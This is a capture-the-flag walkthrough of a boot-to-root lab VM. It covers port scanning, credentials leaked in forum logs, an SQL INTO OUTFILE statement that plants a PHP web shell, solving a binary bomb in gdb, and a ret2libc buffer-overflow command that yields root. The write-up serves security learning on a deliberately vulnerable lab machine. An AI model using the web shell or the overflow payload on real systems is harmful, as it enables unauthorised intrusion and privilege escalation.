# Main way

Since bridged adapter is blocked in the school - I setup kali linux vm and boot-to-root vm through host-only adapter.
I created local network through *VirtualBox->File->Host network manager*, and it's ip *192.168.56.1/24*.
Now, there is a local network with kali vm, boot-to-root vm and host computer.
And kali will see only host computet and boot-to-root vm.
My kali linux ip is 192.168.56.101 (through * ip a *).
And we need to find out how can we interact with boot-to-root vm. For this I check all available ports im my local network with * nmap 192.168.56.1-225 *

For only one non host port in my local network I received:
Nmap scan report for 192.168.56.102
Host is up (0.0010s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

So boot-to-root vm running on 192.168.56.102 ip, and have few open ports.

On http there is site, which is pretty empty, I check it html source code and there is nothing interesting in it. 
After that I scanned it with * skipfish -o path_to_save http://192.168.56.102 * and * nikto -h http://192.168.56.102 *, and not found thomething interesting.

There is another open port which could be scanned, it's https.
using * nikto -h https://192.168.56.102 * we recieve few interesting dirs: forum, webmail, phpmyadmin

On forum there are 4 topics and only one is iteresting, topic *Probleme login* where user *lmezard* push logs with attempts to log in.

In these logs we can see, what username lmezard used trying to log in, it's *Failed password for invalid user 'username'* 
And there is interesting username in string * Failed password for invalid user !q\]Ej?*5K5cy*AJ *
And, these characters came up for lmezard password.

In lmezard profile we could see his email, so we go to webmail, and try the same password !q\]Ej?*5K5cy*AJ to his mail. And it's fits again.

In mail there is message * DB Access * which contains * Use root/Fg-'kKXBj87E:aJ$  *. It doesn't fit to ssh and ftp connection, but it's fit to phpmyadmin.

First of all I checked all tables in db, but all users passwords hashed and I didn't find any helpful information.
And another way to get access to server - is SQL injection through which you can access the shell.
(detailed articles about SQL injections https://null-byte.wonderhowto.com/how-to/use-sql-injection-run-os-commands-get-shell-0191405/ https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2)

* SELECT  '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/hack.php' *
templates_c - dir which always need write permission, used for compiled templates. I found it through *dirbuster* and brute force dirs to write access.

After that we can run something like this * https://192.168.56.102/forum/templates_c/hack.php?cmd=pwd * and it will show pwd output * /var/www/forum/templates_c *

After a little research, we can see LOOKATME dir in home dir with other users (I used curl because more convenient output):
* curl --insecure 'https://192.168.56.102/forum/templates_c/hack.php?cmd=ls%20-la%20/home' * (--insecure because of https not safe)
drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
drwxr-xr-x 1 root                 root                 200 Apr 16 04:01 ..
drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz

There is file password in LOOKATME dir, which contains * lmezard:G!@M6f4Eatau{sF" *

This password fit to ftp port, which contains README file - "Complete this little challenge and use the result as password for user 'laurie' to login in ssh", and fun file (which need to be solved).
(command 'get' to receive files through ftp)

### lmezard
File fun is archive (I found out it because of '0ustar' mark in file).
After unzipping (* tar -xf fun *)
There is a folder * ft_fun * with a lot of pcap files.

These files have c code, and comments which number/line it has.
So we need to write script which will correct concat them into c file. (script attached)
And the name of this script is "build_program.py". Run it to get full program.
Compile and run this program. Got "Iheartpwnage" password and advice to use sha-256.

### laurie
```
echo -n "Iheartpwnage" | shasum -a 256
```
laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

There is bomb here. Bomb contains of 6 phases. We should input correct key in each stage.
```
scp -P 2222 laurie@127.0.0.1:bomb ./
```

gdb bomb

    disas main
    disas phase_1
    x/1cs 0x80497c0
    "Public speaking is very easy."

    disas phase_2
    Program expects 6 numbers. First is 1, and every number = prev * (index(cur) + 1)
    "1 2 6 24 120 720"

    disas phase_3
    It is very difficult to read this asm code. And We downloaded cutter to decompile bomb. Yeah, this way is much better.
    We see switch-case condition here and there is several correct combinations.
    0 q 777
    1 b 214

    phase_4
    Recursive function, which returns sum of calls this function with num - 1 and num - 2. If num < 2 function returns 1. We need 55.
    1 -> 1
    2 -> 2
    3 -> 3
    4 -> 5
    5 -> 8
    6 -> 13
    7 -> 21
    8 -> 34
    9 -> 55

    phase_5
    So we will have some sex with bytes here.
    We shoud get word "giants". Program expects 6 charachters.
    Logical AND with 0xF uses for each inputed character, and then get this num as index of "isrveawhobpnutfg" array.
    So we need indexes: 15 0 5 11 13 1.
    Look at ascii table and get characters which hexadecimal second digit are f, 0, 5, b, d, 1. It is "opekmq".

    phase_6
    Program expects 6 numbers.
    Inside program is array with numbers 253 725 301 997 212 432.
    There are 4 cycles here.
    1) Checks that each number is unique and 1 <= n <= 6.
    2) 3) Build new array from program's array with inputed indexes.
    4) Check that new array is sorted.
    So we need numbers "4 2 6 3 1 5".

README says to remove spaces when we have FULL the password. Ok, lets concatenate all strings and remove spaces.
"Publicspeakingisveryeasy.126241207201b2149opekmq426135". This is password for thor.

### thor
Use our "parse_turtle_steps.py" script and look at word "SLASH".
```
md5 -s SLASH -> "646da671ca01bb5d84dbb5fb2238dc8e" password for zaz.
```

### zaz
You can see expolit_me file there. This program takes argument and prints it. With decompiled code we can see that there is only 140 bytes buffer inside main. And strcpy uses here. Excellent opportunity to overflow buffer and use ret2lib exploit.

We need to know system command adress and '/bin/bash' string address.

gdb exploit_me

    break main
    run
    print &system                           > 0xb7e6b060 > '\xb7\xe6\xb0\x60'
    find &system, +9999999, "/bin/sh"       > 0xb7f8cc58 > '\xb7\xf8\xcc\x58'


Now we can run this command
```
./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'aaaa' + '\xb7\xf8\xcc\x58'[::-1])")
```

Whaaat is going on? Whoami? A im root! System has been hacked.

Description of ret2lib exploit.
https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf

Gdb useful things.
https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
